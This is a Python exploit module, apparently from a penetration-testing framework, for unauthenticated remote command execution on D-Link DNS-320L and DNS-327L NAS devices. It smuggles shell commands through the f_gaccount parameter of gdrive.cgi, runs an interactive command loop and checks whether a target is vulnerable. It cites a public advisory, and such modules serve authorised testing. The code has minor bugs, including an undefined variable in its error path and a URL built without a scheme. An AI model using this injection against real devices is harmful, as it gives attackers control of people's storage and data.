#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re
import string

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DNS-320L 327-L Remote Command Execute',
        'description': 'D-Link DNS-320L 327L allow remote command execute without credits',
        'reference': ['http://www.search-lab.hu/media/D-Link_Security_advisory_3_0_public.pdf'],
    }

    prompt = 'dns_gdrive_rce'

    def __init__(self):
        super().__init__()

    def run(self, host, port, timeout):
        self.command_loop(host, port, timeout)

    def execute(self, host, port, timeout, cmd):
        mark = utils.random_text(32)
        url = "{}:{}/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo {};".format(host, port, cmd, mark)

        response, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, err)
            return ''

        if mark in response.text:
            regexp = "(|.+?){}".format(mark)
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    def check(self, host, port, timeout):
        number = int(utils.random_text(6, alph=string.digits))
        solution = number - 1

        cmd = "echo $(({}-1))".format(number)
        url = "http://{}:{}/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo ffffffffffffffff;".format(host, port, cmd)

        response, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, port, e)
            self.print_check_result(False, host)
            return False

        if response.status_code == 200 and str(solution) in response.text:
            self.print_check_result(True, host)
            return True  # target is vulnerable

        self.print_check_result(False, host)
        return False
